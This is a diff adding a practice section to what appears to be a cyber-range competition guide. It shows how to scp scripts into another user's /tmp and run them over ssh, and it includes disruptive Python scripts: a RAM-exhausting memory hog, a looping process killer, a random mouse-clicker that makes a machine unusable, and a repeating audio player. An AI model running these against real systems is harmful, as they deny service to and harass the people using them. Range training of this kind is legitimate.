@@ -219,9 +219,19 @@ Actually go back to the Kali machine to see if you received a notification
 ---
 # Part 5: practice and explore
     
-## Use the following scripts to experiment on the range     
-
+## Use the following scripts to experiment on the range  
+ - create a blank document that ends in .py (ex memory_hog.py) and run it by opening a terminal in the same directory and typing python3 memory_hog.py. Some scripts you run might need to be run with sudo privileges sudo python3 my_script.py
+    
+## Scripts that work if you are on another user    
+Use the ability to write to the /tmp/ directory and run scripts from it to impact other users    
+#### `scp kill_bully_memory.py <user>@<ip.address.here.blah>:/tmp/`
+#### `ssh <user>@<ip.address.here.blah>
+#### `python3 /tmp/kill_bully_memory.py`
+    
 ### Memory Hog (Consumes RAM Until the opponent system freezes)
+ - Fills RAM until the system lags or crashes.    
+ - Uses multiple processes to make it harder to stop.
+    
 <div class="scroll-box">
 #!/usr/bin/env python3    
 import multiprocessing    
@@ -241,7 +251,11 @@ if __name__ == "__main__":
 </div>
    
 
-### Process Killer (kills processes running in python3)    
+### Process Killer (kills processes running in python3)
+ - Uses pgrep -f to find running Python scripts.    
+ - Kills the process if found.    
+ - Runs in a loop so the bully can’t restart the script easily    
+
 <div class="scroll-box">
 #!/usr/bin/env python3
 import subprocess
@@ -266,4 +280,52 @@ if __name__ == "__main__":
     while True:
         find_and_kill_process()
         time.sleep(2)  # Check every 2 seconds
+</div>
+
+## Not useful for the competition, but fun... learn by breaking things    
+    
+### UI Chaos (Randomly Moves & Clicks the Mouse)    
+ - Uses PyAutoGUI to randomly move and click the mouse    
+ - Disrupts the bully’s control of their computer    
+ - Runs forever unless killed     
+
+<div class="scroll-box">
+#!/usr/bin/env python3
+import pyautogui
+import time
+import random
+
+def chaos_mouse():
+    """Randomly moves the mouse and clicks, making the machine unusable."""
+    while True:
+        x = random.randint(0, pyautogui.size()[0])
+        y = random.randint(0, pyautogui.size()[1])
+        pyautogui.moveTo(x, y, duration=0.2)
+        if random.random() < 0.5:
+            pyautogui.click()
+        time.sleep(1)
+
+if __name__ == "__main__":
+    chaos_mouse()
+</div>
+    
+### Audio Mayhem (Plays an audio file just to be annoying)    
+ - Runs continuously    
+ - Plays a sound every 5 seconds    
+ - Disrupts the user’s ability to focus on their attack    
+ - you could SCP a Rick Roll here for good flavor    
+    
+<div class="scroll-box">
+#!/usr/bin/env python3
+import os
+import time
+
+def play_noise():
+    """Plays an annoying beep sound every 5 seconds."""
+    while True:
+        os.system("aplay /usr/share/sounds/alsa/Front_Center.wav")  # Change to any available sound file
+        time.sleep(5)
+
+if __name__ == "__main__":
+    play_noise()
 </div>
